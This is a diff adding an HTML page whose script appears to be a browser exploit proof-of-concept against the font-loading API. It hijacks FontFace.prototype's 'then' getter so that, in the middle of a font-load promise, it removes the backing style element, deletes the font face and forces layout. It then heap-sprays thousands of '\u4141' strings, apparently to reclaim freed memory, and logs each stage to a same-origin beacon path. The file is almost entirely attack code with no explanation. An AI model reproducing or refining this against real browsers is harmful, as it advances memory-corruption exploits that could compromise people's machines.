@@ -1,0 +1,58 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>big2</title>
+<body><p>big2</p>
+<script>
+function b(x){ var i=new Image(); i.src='/beacon/'+x+'?t='+Date.now(); }
+b('G2-PARSE');
+var it = 0, curIter = -1, curStyle = '';
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (this.__fired) return undefined;
+    this.__fired = true;
+    var i = curIter;
+    b('G2-'+i+'-GET');
+    var v = document.getElementById(curStyle);
+    if (v) v.remove();
+    try { document.fonts.delete(this); } catch(e){}
+    document.body.offsetHeight;
+    b('G2-'+i+'-LAY');
+    var spray = [];
+    for (var q = 0; q < 2000; q++) {
+      var arr = new Array(128).fill("\u4141");
+      spray.push(arr.join(""));
+    }
+    b('G2-'+i+'-SPR-' + spray.length + '-' + spray[0].length);
+    var c = 'unknown';
+    try { c = document.fonts.check('1em x'); } catch(e){ c = 'throw'; }
+    b('G2-'+i+'-CHECK-' + c);
+    b('G2-'+i+'-RET');
+    return undefined;
+  },
+  set: function(){}
+});
+function step(){
+  if (it >= 10) { b('G2-DONE'); return; }
+  var i = it++;
+  curIter = i; curStyle = 'vs'+i;
+  b('G2-'+i+'-START');
+  var st = document.createElement('style');
+  st.id = curStyle;
+  st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(st);
+  var A = new FontFace('a', 'local(Helvetica)', {unicodeRange: 'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  document.fonts.load('1em a, x', 'AB').then(
+    function(){ b('G2-'+i+'-RES'); },
+    function(){ b('G2-'+i+'-REJ'); }
+  );
+  setTimeout(function(){
+    try { document.body.offsetHeight; } catch(e){}
+    b('G2-'+i+'-END');
+    setTimeout(step, 60);
+  }, 120);
+}
+step();
+</script>
